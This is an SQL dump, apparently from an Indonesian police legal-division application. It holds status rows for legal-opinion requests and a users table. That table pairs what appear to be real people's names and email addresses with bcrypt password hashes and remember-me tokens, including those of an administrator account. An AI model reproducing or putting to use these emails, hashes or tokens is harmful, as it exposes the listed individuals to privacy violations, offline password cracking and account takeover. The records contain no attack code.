INSERT INTO `pendapat_saran_proses` VALUES (124, '2021-11-25', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:14:56', '2021-12-23 13:14:56');
INSERT INTO `pendapat_saran_proses` VALUES (125, '2021-11-16', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:17:09', '2021-12-23 13:17:09');
INSERT INTO `pendapat_saran_proses` VALUES (126, '2021-11-08', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM.', 'Administrator', '2021-12-23 13:20:46', '2021-12-23 13:20:46');
INSERT INTO `pendapat_saran_proses` VALUES (127, '2021-12-09', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:23:43', '2021-12-23 13:23:43');
INSERT INTO `pendapat_saran_proses` VALUES (128, '2021-10-27', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:27:38', '2021-12-23 13:27:38');
INSERT INTO `pendapat_saran_proses` VALUES (129, '2021-10-26', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:31:58', '2021-12-23 13:31:58');
INSERT INTO `pendapat_saran_proses` VALUES (130, '2021-05-31', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:38:13', '2021-12-23 13:38:13');
INSERT INTO `pendapat_saran_proses` VALUES (131, '2021-10-22', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:43:19', '2021-12-23 13:43:19');
INSERT INTO `pendapat_saran_proses` VALUES (132, '2021-10-27', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 14:19:55', '2021-12-23 14:19:55');
INSERT INTO `pendapat_saran_proses` VALUES (133, '2021-11-03', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 14:27:54', '2021-12-23 14:27:54');
INSERT INTO `pendapat_saran_proses` VALUES (134, '2022-01-03', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM dan dikerjakan oleh PS PAUR I SUBBID BANKUM PENATA TK I I WAYAN GATOT MADIYASA, S.H.', 'Administrator', '2022-01-17 13:23:22', '2022-01-17 13:23:22');
INSERT INTO `pendapat_saran_proses` VALUES (135, '2022-01-25', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-01-27 14:09:12', '2022-01-27 14:09:12');
INSERT INTO `pendapat_saran_proses` VALUES (136, '2022-01-20', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-01-27 14:12:01', '2022-01-27 14:12:01');
INSERT INTO `pendapat_saran_proses` VALUES (137, '2021-12-30', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-01-27 14:13:59', '2022-01-27 14:13:59');
INSERT INTO `pendapat_saran_proses` VALUES (138, '2022-01-21', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-01-27 14:17:57', '2022-01-27 14:17:57');
INSERT INTO `pendapat_saran_proses` VALUES (139, '2022-01-25', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-01-27 14:20:20', '2022-01-27 14:20:20');
INSERT INTO `pendapat_saran_proses` VALUES (140, '2022-01-25', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES&nbsp;', 'Administrator', '2022-02-09 11:38:51', '2022-02-09 11:38:51');
INSERT INTO `pendapat_saran_proses` VALUES (141, '2022-02-02', 'MASIH DALAM PROSES', '<b></b>PSH MASIH DALAM PROSES.<b></b>', 'Administrator', '2022-02-09 11:42:18', '2022-02-09 11:42:18');
INSERT INTO `pendapat_saran_proses` VALUES (142, '2021-12-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/111/II/HUK.12.10./2022/Bidkum', 'Administrator', '2022-02-15 11:06:46', '2022-02-15 11:06:46');
INSERT INTO `pendapat_saran_proses` VALUES (143, '2022-02-09', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-02-15 12:04:47', '2022-02-15 12:04:47');
INSERT INTO `pendapat_saran_proses` VALUES (144, '2022-02-17', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES', 'Administrator', '2022-03-04 13:01:31', '2022-03-04 13:01:31');
INSERT INTO `pendapat_saran_proses` VALUES (145, '2022-02-17', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/208/III/HUK.12.10./2022/Bidkum', 'Administrator', '2022-04-04 11:24:54', '2022-04-04 11:24:54');
INSERT INTO `pendapat_saran_proses` VALUES (146, '2022-01-20', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 12:50:28', '2022-06-06 12:50:28');
INSERT INTO `pendapat_saran_proses` VALUES (147, '2022-02-10', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 12:54:49', '2022-06-06 12:54:49');
INSERT INTO `pendapat_saran_proses` VALUES (148, '2022-02-10', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 12:57:45', '2022-06-06 12:57:45');
INSERT INTO `pendapat_saran_proses` VALUES (149, '2022-02-09', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:04:39', '2022-06-06 13:04:39');
INSERT INTO `pendapat_saran_proses` VALUES (150, '2022-03-15', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:10:12', '2022-06-06 13:10:12');
INSERT INTO `pendapat_saran_proses` VALUES (151, '2022-03-30', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:14:04', '2022-06-06 13:14:04');
INSERT INTO `pendapat_saran_proses` VALUES (152, '2022-03-25', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:16:23', '2022-06-06 13:16:23');
INSERT INTO `pendapat_saran_proses` VALUES (153, '2022-03-29', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:20:27', '2022-06-06 13:20:27');
INSERT INTO `pendapat_saran_proses` VALUES (154, '2022-03-15', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:22:59', '2022-06-06 13:22:59');
INSERT INTO `pendapat_saran_proses` VALUES (155, '2022-04-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:27:04', '2022-06-06 13:27:04');
INSERT INTO `pendapat_saran_proses` VALUES (156, '2022-04-21', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:29:59', '2022-06-06 13:29:59');
INSERT INTO `pendapat_saran_proses` VALUES (157, '2022-04-20', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:32:52', '2022-06-06 13:32:52');
INSERT INTO `pendapat_saran_proses` VALUES (158, '2022-04-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:35:32', '2022-06-06 13:35:32');
INSERT INTO `pendapat_saran_proses` VALUES (159, '2022-04-26', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2022-06-06 13:38:26', '2022-06-06 13:38:26');
INSERT INTO `pendapat_saran_proses` VALUES (160, '2022-04-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM&nbsp; DENGAN NOMOR R/375/VI/12.10./2022/Bidkum', 'Administrator', '2022-06-08 12:08:00', '2022-06-08 12:08:00');
INSERT INTO `pendapat_saran_proses` VALUES (161, '2022-05-16', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/374/VI/HUK.12.10./Bidkum', 'Administrator', '2022-06-08 12:10:58', '2022-06-08 12:10:58');
INSERT INTO `pendapat_saran_proses` VALUES (162, '2022-05-10', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/376/VI/HUK.12.10./2022/Bidkum&nbsp;', 'Administrator', '2022-06-08 12:13:43', '2022-06-08 12:13:43');
INSERT INTO `pendapat_saran_proses` VALUES (163, '2022-04-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/578/VI/HUK.12.10./2022/Bidkum', 'Administrator', '2022-06-09 15:52:15', '2022-06-09 15:52:15');
INSERT INTO `pendapat_saran_proses` VALUES (164, '2022-05-25', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/377/VI/HUK.12.10./2022/Bidkum', 'Administrator', '2022-06-09 15:59:19', '2022-06-09 15:59:19');

-- ----------------------------
-- Table structure for pengguna
-- ----------------------------
DROP TABLE IF EXISTS `pengguna`;
CREATE TABLE `pengguna`  (
  `pengguna_id` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pengguna_nama` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pengguna_sandi` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `remember_token` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `pengguna_admin` tinyint(1) NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of pengguna
-- ----------------------------
INSERT INTO `pengguna` VALUES ('admin', 'Administrator', '$2y$10$Au0ik9wXLrgnIzwuYnbIEOgEFp4hA9MdgifWYOND4U/I7cMFGNEmO', '6CyhBoB44ZZkzlpIyDBG2vyunEyM69b3pY1mFOmmykPdDKYtwnuULL6OEh3P', 1, '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `pengguna` VALUES ('agusismail432@gmail.com', 'AGUS ISMAIL', '$2y$10$vWiReGP2O8DNtJNOZVdnFOukdPhi7kV7JoxHQcx8mubnwxZ97zEHK', 'ptVxPnvzOXkFC0bPuDhb0zEp917tSlzsPPhMwTCXnmjW4vT3SCVdXrIobNSa', 0, '2021-03-23 20:27:50', '2021-03-23 20:27:50');
INSERT INTO `pengguna` VALUES ('ahmadamin3012@gmail.com', 'Ahmad Amin', '$2y$10$lj1FGyyK723wrGBCVVwpSu2CrKk4coqLKifv8kDkoPLixBhyEcO0u', 'IF2Xu9GnN6pDlqSmg0xjhRuodLJrIilDU9k5Pf7mwseqPl5xatBC1P0njELV', 0, '2021-03-23 10:46:06', '2021-03-23 10:46:06');
INSERT INTO `pengguna` VALUES ('amiruddin1916@gmail.com', 'AMIRUDDIN', '$2y$10$64RnDgEVucowsQqX59tKE.n/z1rk7Mw9bTmstbyK7xmhiZnr3jhB.', 'K42rTr4QZzHRHWm2x510FwMaIuAptdQk9m1uSf6qGcSMG5fboeBFMuZSk4he', 0, '2021-03-24 11:39:55', '2021-03-24 11:39:55');
INSERT INTO `pengguna` VALUES ('andifajar@mail.com', 'Fajar', '$2y$10$ZJXWKjlMm48mPX5TueXeZOelrhiiPVHWDjNspB4/KFId3itiBpBM6', '5oSSYKZ7bm6UyzNgzxfVi9KwxapbHLQgewu9BqrjlLOMbyBV6iKOac0e1FZy', 0, '2020-07-28 08:38:15', '2020-07-28 08:38:15');
INSERT INTO `pengguna` VALUES ('aruldien09@gmail.com', 'Syahruddin', '$2y$10$3qSvC74NT4z2QsKEx4InW.a7rmql0jcgJ.kPrNpk/A7UNZZcsNyIS', 'Xpb5gQQr7tK5q4Q00Ykwk47DETQDhgBVkC6VcnZJAFvAAiha3bHFm9zTuSFv', 0, '2021-03-15 12:59:34', '2021-03-15 12:59:34');
INSERT INTO `pengguna` VALUES ('bapaksamudra04@gmail.com', 'IDA BAGUS SAMUDRA', '$2y$10$oJM0EpxcO3RGwkY26xn1DeFp2TdinuogQ4begR.Z9vErwF5.w/qP.', 'CBotOd9AlcWHZOlTbKmjI8PyTIv1jfLvQblbEI6mKLaR68AIu9slCqpfvX8o', 0, '2021-03-23 18:34:49', '2021-03-23 18:34:49');
INSERT INTO `pengguna` VALUES ('bimasaidin7@gmail.com', 'Saidin', '$2y$10$.QySpxA4RjxmjwWSTqkpsO8HsP3Uexk05lXFZOWMsiNGp3FUQ0rUq', '7XZWCz4gRlLLqbuS5kyH4c8h7UwQS8eIh6Qy8914hxl0wErQNTPLqJsGjOSx', 0, '2021-03-15 12:57:56', '2021-03-15 12:57:56');
INSERT INTO `pengguna` VALUES ('deddijintor@gmail.com', 'Deddi Nirwanto', '$2y$10$QjluZAiRK80ckwtrTkDwsuwnMU/mplY5irBpw2JY1bSTJO6PEpIQG', 'KWerIcvmgY04RZ0C6gyi8AumyUptf3HqND5TYgV7fbSA9hUQOciVAFyNRgns', 0, '2020-11-16 19:35:48', '2020-11-16 19:35:48');
INSERT INTO `pengguna` VALUES ('firmansyahferdi84@gmail.com', 'Jon', '$2y$10$aH5K7yNFe/a6S5uayoye0uD8Qqu7vVrjeAEWST5sjMUyO9gZJBpVS', 'JcV6pzM8TKET2xeVsr6nqXDb0yxmixxtVt7q1RipAwSoRbSk1JKTHEWrOa9c', 0, '2021-03-23 11:44:02', '2021-03-23 11:44:02');
INSERT INTO `pengguna` VALUES ('harisolo79@gmail.com', 'Hariyanto', '$2y$10$viwgEw/owZ6mPgErFMoHNelyoAEtCWmbrky4T0kJgyrcgVMYHbLJe', 'k6EfaNCH1iiME1zrLfMhe4QANaRpEdxj7715d66uUS9lnpabV1O0xnJRDS8I', 0, '2021-03-18 13:16:16', '2021-03-18 13:16:16');
INSERT INTO `pengguna` VALUES ('hehendrawansupriadi38@gmail.com', 'Hendrawan Supriadi', '$2y$10$dhm9SM991vg9gZesmt/cZuKGgafCJfOkzIBbYWWX60eX7H4rVTtPq', 'DSEyxbsjWw5Kh1Vl3dQYVNQXrIt4DiHPekDdgTqmIe7mfMaYC4guEFis1UH1', 0, '2021-03-23 11:09:41', '2021-03-23 11:09:41');
INSERT INTO `pengguna` VALUES ('hendrawannn97@gmail.com', 'muhamad henfrawan', '$2y$10$lfA4gblq3NgrHatNgyfFJuv3tzI97.ULDEgSG2KM9otw48BDmPWWu', 'oBRYfQCkTwHDCqsXKM2laok2tUS7i8lVJGhnkvMFV8A3vMevaVqarb2kc3C4', 0, '2021-03-24 11:40:16', '2021-03-24 11:40:16');
INSERT INTO `pengguna` VALUES ('hendrisatriawan4238@gmail.com', 'Hendri Satriawan', '$2y$10$yVZRIBQFT72sPGRuo4n9Yu9ldr18TB60WeRi0XU4hoGRfd9gwLWx2', '8R0WnRe9TjMUiMCqGjZNv6gJe4ZntECZMFxKukneIJ1ndZbFTaKayOk7hopC', 0, '2021-03-19 11:53:52', '2021-03-19 11:53:52');
INSERT INTO `pengguna` VALUES ('imamtriyanasaputra@gmail.com', 'Imam Triyana Saputra', '$2y$10$h4HXdWDpu8cgd9p7yWU4aOAWqcGkggdgmyObN.BRm3rVTs1h5FShK', 'cJICNyU9zlIHoCVq6QehDcw5f8qJVImL5nGj4JgVx0UT30AR14JvNs8K9tj4', 0, '2021-03-22 11:08:46', '2021-03-22 11:08:46');
INSERT INTO `pengguna` VALUES ('jaelaniahmad82032@gmail.com', 'Ahmad jaelani', '$2y$10$U/a/5xyDwoo1pZSIEOltKeAho1UPtOVd4Vs.qG9.Ymw4Mnbek0rh2', 'oJkJg4YJ098nOw5salVgkBSLiykYr7moZqx9vdqWjVGVem9rnv14BpbqL3M0', 0, '2021-03-23 10:30:32', '2021-03-23 10:30:32');
INSERT INTO `pengguna` VALUES ('jalila2474@gmail.com', 'Muh. Rofi\'i', '$2y$10$.ibuSIrUbtEDSbS8M3fb/.sJ8sJc1LovoKEK9hXbERnOSGcV0qrly', 'YvLZry8CbaO3JT25Io5bXH4QRVii2Sn0CX77IsuuD5M7XiJwuhod1iuo3we5', 0, '2020-08-09 22:24:13', '2020-08-09 22:24:13');
INSERT INTO `pengguna` VALUES ('johanyuga@gmail.com', 'Johan', '$2y$10$4CC1RXY45rkY/CP5EKMTw.irBzmKpZ7/teiHTwOfToBtgL7LChfOW', 'pwKS8wDEfi7zCjLkqNaLUOL8T4aWq1cQe6XukZjmYZWl5aJnlvJxrCDmfGUO', 0, '2020-01-30 12:46:03', '2020-01-30 12:46:03');
INSERT INTO `pengguna` VALUES ('joniiskandar@gmail.com', 'Jony iskandar', '$2y$10$hdirGOt5xTTqhk/3TiVEq.Gtqq/IVWL/Cc4lZYzkahzu9syYTjAnW', '5UlreBotbRl9U4qzlttHbK25vWSkDtCksZ4mYte0JJngZQBIi28kTTVhiDnn', 0, '2021-01-15 23:58:14', '2021-01-15 23:58:14');
INSERT INTO `pengguna` VALUES ('Julpamungkass6@gmail.com', 'Gede Juliatno', '$2y$10$pQQ4v2TVbUSHyEsYRa7Pmu1Y9NzpDmTcj4kWLgBc65KTKBfLydNnu', 'erpKQLjOUTk1ZDjmCDhw5nKUri9oajlnRt3W89sXgCpkRWGCirpq4kHusnEb', 0, '2021-03-23 14:12:06', '2021-03-23 14:12:06');
INSERT INTO `pengguna` VALUES ('lalunabiel9723@gmail.com', 'Lalu Nabiel', '$2y$10$LbrFCgkjc2t2zxAj89AR9OnDRQ1ugjqSHjgBi636fcDPZ4WzsXWoe', 'WSYwiJZyJHWQjhD1J0lCROefQhflLeIYig6C8rTEKO4XJNSC8huQ70hnMlKD', 0, '2021-01-29 18:33:30', '2021-01-29 18:33:30');
INSERT INTO `pengguna` VALUES ('laluyanto32@gmail.com', 'laluyanto', '$2y$10$dTdlMvRRQzzj.uEFeYlO7uhftXszE2EQXWXKjlLEK6mUB7p/Aw81m', '5xrOiYKoRlloRxdr8dErsEgksH9yQfSoX8M6gy7b0SWh675lzIoLeTaxKl9A', 0, '2021-03-19 20:37:35', '2021-03-19 20:37:35');
INSERT INTO `pengguna` VALUES ('mahpoezolet@gmal.com', 'Mahpuz', '$2y$10$LOK3BIpIdoz2gMN9g39mJOOHt4cB.rXsfWyG4Bl7.3OudNxgHozb6', 'GjftqlAjMqXwdbmx6yp8wVsFAekOdftIWfSezibU0BFMhysiatK6Ymga2Qh5', 0, '2021-03-24 11:50:17', '2021-03-24 11:50:17');
INSERT INTO `pengguna` VALUES ('musamataram@gmail.com', 'Musa', '$2y$10$/lwXK1qzbRRQCW0SKTafr.7tLbr8tc/u/cQ36MErROM4bAVyvkIsm', 'qGJ0FVwVPogiNKHDLwQKvSCRy8OOTabIEcFljSP4uzmo0qgJvB6Iz92O5SpA', 0, '2021-01-29 07:45:10', '2021-01-29 07:45:10');
INSERT INTO `pengguna` VALUES ('naufalvata@gmail.com', 'Sukaman', '$2y$10$THIZSHDwXCq4LqwYlrpuN.xGYD5uPOjbC5WezGucZ/8avIwMUrChu', '2ySGDJ8FN4WKEiKe6jiAnrWacVNR8utgnx9MDRl027nuWV9In1MwCiEr1f0E', 0, '2021-03-23 10:43:05', '2021-03-23 10:43:05');
INSERT INTO `pengguna` VALUES ('rudi.tatang@yahoo.co.id', 'JAHARUDIN', '$2y$10$IdGLiW8qGopcDeOTRuu54OK7DFivh7l3GNWeCab6ywTE.2aVXJySi', 'BNX84A1f1ovaAoqXMNCBzGHYXRIugNDkaszPMe2qT1IcGLGBsO7dgldijfDd', 0, '2021-03-23 10:31:42', '2021-03-23 10:31:42');
INSERT INTO `pengguna` VALUES ('rudykrisno5@gmail.com', 'Rudy krisno wibowo', '$2y$10$FB2QvLcKl7U8zDlNmFxFbeSoKEESjh1HDjse37.ufQMQStw4U6w0W', 'mIoIn0lElQWBGSGj0ScX0PDtpLYo0ImExCjzEqewyLrPQ7gD5sQRpjF1TiVX', 0, '2021-03-18 13:17:33', '2021-03-18 13:17:33');
INSERT INTO `pengguna` VALUES ('rumaraeirwan@gmail.com', 'Ruma Rae', '$2y$10$Wqg5mjj6rq5fi60F4HccTOjTswEm/pVFiYsEYLhAa.h2mIQWRwIma', 'CWFH908AJbzSYnVzmSMBbeMVoXHpFeclpjf8yovPuz6XB9fUfoVilDM8poIP', 0, '2020-01-31 15:39:23', '2020-01-31 15:39:23');
INSERT INTO `pengguna` VALUES ('sabhara87071419@gmail.com', 'I PUTU EDI SOPIANA PUTRA', '$2y$10$A7tSEYrV85soDp3R/IGmb..6kF/rG8k1k.9Vv9PIZunRZDBDyuwg2', 'IMmWK8ETUTEjZOBZJssZnjoGvoKq2a9FPc2zzeYn97tIRyy1YcxAYd1qupkM', 0, '2021-03-24 11:39:41', '2021-03-24 11:39:41');
INSERT INTO `pengguna` VALUES ('sinurat160980@gmail.com', 'Riskarhamdanisinurat', '$2y$10$dAN50hBotsgnc3deqeD5Uezk.JVdtnkLrCMGq.ZO8u4YGweBz/8yG', 'y0vGDAOjDlWLqbXsu74d8MC2wcFsnbTmsER6HThV0cGef74fxVkeWDZotAqj', 0, '2021-03-18 13:16:50', '2021-03-18 13:16:50');
INSERT INTO `pengguna` VALUES ('sudarmininggid@gmail.com', 'SUDARMIN', '$2y$10$Iq/8/PJetLxseHLu7hHbkOuSQMkzs0j2BHbxQLkzofx.8iRj2rmHS', 'IUUP3yQWg5DG3vcEr4X1zm1F5SrG4TjEUrkkWtOZcmXjSVLdQXUop5RbHrDJ', 0, '2021-03-18 13:17:15', '2021-03-18 13:17:15');
INSERT INTO `pengguna` VALUES ('sugyantoanton00544@agmail.com', 'Sugiyanto', '$2y$10$08lKTAZT5vpNU77Ne8E9Zui1PotwAlqn5RBt0wefHq5a.iuixnxyS', 'pX10Oxhj4qGXDN9pATpjopPWjJPLGW3DXWGolBctSK7ACYvVEz6whjjKgbxb', 0, '2021-03-15 12:52:49', '2021-03-15 12:52:49');
INSERT INTO `pengguna` VALUES ('syahmuddin82.ut@gmail.com', 'SYAHMUDDIN', '$2y$10$vzkGteH5WoT1i.AwhJTvhOy9jGDu7EtIGxqhz5r8Qb1aafvSnlVIu', 'q0Uknudm3SJaBFiIpdMrQ6ORxG0DK97TPfUtTv6z9KXYd5lWTWxjl0XN5xL8', 0, '2021-03-19 16:08:45', '2021-03-19 16:08:45');
INSERT INTO `pengguna` VALUES ('syamsuldtn39@gmail.com', 'As\'ad Syamsul Arifin', '$2y$10$hihHCK8IWLeQ.eNA0FcMGeU/bWOvkUhqIWh88INqL0JfEU2jpKM92', 'oCqrx46ae2FwzHN8PmhjZ07VPK52h7gOhpbE2S15m9Lrj49eqUBPkZHjpDcO', 0, '2021-03-22 11:08:37', '2021-03-22 11:08:37');
INSERT INTO `pengguna` VALUES ('tialestari500@gmail.com', 'Tia lestari', '$2y$10$3SmGaZuujvCA/NlphdA6v.mJi7ys73lNKjS2Z5WOO403eCAEcCYwm', 'rhyZmnkm15kdgWEXhnCN9CHBspKty9ffyLIBhVrkE8DvtcC6OYeAF0CP5tvG', 0, '2021-03-23 11:42:57', '2021-03-23 11:42:57');
INSERT INTO `pengguna` VALUES ('tohriadi081@gmail.com', 'TOHRIADI', '$2y$10$LEWzFQK63vQXR1TD54VxxeSggI38oX.Q51aQrqZVIEjELTygqHuIK', '9rzVteZkOGiFDwnlGxNLXVxEiEhlKCyeDIgzf7xIGMEcpA6F0NsJrQeTBRno', 0, '2021-03-23 10:56:41', '2021-03-23 10:56:41');
INSERT INTO `pengguna` VALUES ('umarduaempat@gmail.com', 'Umar dani', '$2y$10$hC.IN8.PZFeeYkskWyefu.ttVUcyViiTp/dC.XL/HLRsexlGBnIla', 'YkOXbOrL2gvWJPvDORCJXOkX5gZEXdaEvoT2Kt0nNFg1VNTXr11fgTq9iW5W', 0, '2021-03-23 10:29:13', '2021-03-23 10:29:13');
INSERT INTO `pengguna` VALUES ('yudhywan24@gmail.com', 'M.YUDHYWAN S', '$2y$10$jeA8CwJSz4ZIEfuDDOrqjun9CgcN7PYdXllG9j9/SqlGkhbDG/3dG', '6OOY1sgcUJM0pqKlDViP7iNqONPDf5UYn4gLgKfU443AwHXe52RjS7jWAR5Z', 0, '2021-03-23 12:04:49', '2021-03-23 12:04:49');
INSERT INTO `pengguna` VALUES ('yudivk@rocketmail.com', 'Yudi verdiankarisma', '$2y$10$x7FUYDj2WefyBSGhk2Xv5OdiMJOWRiEy35Jx1d8/fXI0frirNs0c2', 'pSLZ9ikS3SnwtQeky44WSFmT0uHANiGfgHQ1c1kmidwMlDfY7V1ZEvB9S9fF', 0, '2021-03-23 10:42:59', '2021-03-23 10:42:59');
INSERT INTO `pengguna` VALUES ('joni@gmail.com', 'joni', '$2y$10$x61RoeYkRwZoTHeT7beAU.ifaa1N/XSx1v6hRu61vGcctCX1YRC1S', 'IkrXlgYVuqDjbQotfJIwsbAL3v2z1QncJL8ZdhlL2otYU3eOhwEghoQ4QO6o', 0, '2021-04-21 15:18:32', '2021-04-21 15:18:32');
INSERT INTO `pengguna` VALUES ('alitayu8701@gmail.com', 'Aliet Ayu Djelantik Sonbait, SH', '$2y$10$mZcB6t7XBqSjpJ7sdQVUPucd0S68sFpHiewNX1ll9/bkcl0zuPpwq', 'DGUhIQAhqXFJJSHFVRjJSF97A6gm59OAemTyXnIRNjNeExZxR5Y13ggPMEMZ', 0, '2021-07-05 12:18:41', '2021-07-05 12:18:41');
INSERT INTO `pengguna` VALUES ('shsuprianto03@gmail.com', 'SUPRIANTO PUTRAYADI,SH', '$2y$10$1x7P4BoEa5V2aSYUcEUjleTbrUAXkil1BLvwKeSLN1oYh4PbvSisG', '7QXrCGKEuE623HPBKFJyMyEdA5azigwgtdJgKen0a3XETHm0a27UOZYYXUah', 0, '2021-07-05 12:20:53', '2021-07-05 12:20:53');
INSERT INTO `pengguna` VALUES ('zulheldisasak36@gmail.com', 'ZULHELDI', '$2y$10$ANR4gL2o8yVNPlJ6fsEitepmZML7NOYmR.EL/511WnVD2NC3/UoQe', 'SQKypsYI256U4nYycWU2sd11smPRstSaowi3QDSoGOpSeJXMvOREJEfJ6se6', 0, '2021-07-05 13:42:26', '2021-07-05 13:42:26');
INSERT INTO `pengguna` VALUES ('ayradirgantara@gmail.com', 'Ahmad Yani Dirgantara', '$2y$10$.sox3B4TyEA8tEdY3Y7K4eV/cG4kgQE21bBKc4PBfgrRHNEOY33HO', 'bdyKpLuLSQaGuRXqIWYT427iTcu16B9adQVtMxiiCxBfBHK4BzZpg54natal', 0, '2021-07-05 16:00:52', '2021-07-05 16:00:52');
INSERT INTO `pengguna` VALUES ('lalatama33@gmail.com', 'herlan', '$2y$10$qbACyraQ7CQXudRtdcA9rOngX10irzldajmepHJmB8xVm9eu1D1Re', 'NS8N9vfJCpd9WiarpCKgZDoInfL8o4oNtmFCfd2xDJ2I2XHCgJIetllm1xwh', 0, '2021-07-05 19:40:23', '2021-07-05 19:40:23');
INSERT INTO `pengguna` VALUES ('khaerullalu@gmail.com', 'Lalu khaerul wijaya', '$2y$10$MCvR0ZQonaHnvhrD/d1kQ.7DC61fP9Lnoute4Day3cUb2eEc4GUC.', 'V9D1UUFWBDlhdmrMgXmTSLigqIlhE0u0FcGnoc0wL7JDnTJDAFtpqHryyXNF', 0, '2021-07-05 20:27:43', '2021-07-05 20:27:43');
INSERT INTO `pengguna` VALUES ('erlans221@gmail.com', 'ERLAN SUHADI', '$2y$10$C5bg3l/RTokVfueBFKzs4eeH/zf2QLapx0ULN.iTNnAEMnhs48qTy', '4Uc3xytTqW2RR6wkWMFobuasq7dHSJGSQxGzi2KM696UH9XbMvsmAGDd8JY9', 0, '2021-07-06 12:45:12', '2021-07-06 12:45:12');
INSERT INTO `pengguna` VALUES ('iizzat282@gmail.com', 'SAMSU RIZAL', '$2y$10$cqV.BhdoLEv7WwMvGgVWNeqzdf4vEAuDAW.Bv51egGaIWrZfzWdPy', 'SsLep2hKhEqb1ipqpo0fg3VpMMWgubJ0VOU2wSEvgFLdomvioauc7uxqxJAe', 0, '2021-07-06 15:11:45', '2021-07-06 15:11:45');
INSERT INTO `pengguna` VALUES ('winarnowinarno395@gmail.com', 'Winaro', '$2y$10$YOjzwezzziCg.Pu9tvfgneiRh7xqcIykPFJ1BtILBhaj8RjyAuDyO', '66v0zEFlfopQFMicLrvp0nI5e34abG6PWCANXY8NEsK8JFPrBJnNbMVtMJ4o', 0, '2021-07-06 15:54:23', '2021-07-06 15:54:23');
INSERT INTO `pengguna` VALUES ('kanakjonggat@gmail.com', 'lalu ahmad fathoni', '$2y$10$QsUM6b3KQtnHne099zqyW.tNtrM1vVo2TGYUPTVeWdjuufrjWyJyi', '666FvxEwrVnNzFEdJSdHHY9auLZDzPhMjGSoc1by21fdxBDCbTn8aTxA2H1M', 0, '2021-07-06 17:07:58', '2021-07-06 17:07:58');
INSERT INTO `pengguna` VALUES ('indahdamai67@gmail.com', 'damaiaman s', '$2y$10$avaEiBlLtU15TZtK4LIhOuvXXxOftA47cZnh3tXFiAxZ7V1AbqqE6', 'iSsIrkB1zmWFhGsBeHjUyi9jiTBdTw7p9imBkcvqAO5bzd1zK5oazbI66Bi2', 0, '2021-07-06 20:47:29', '2021-07-06 20:47:29');
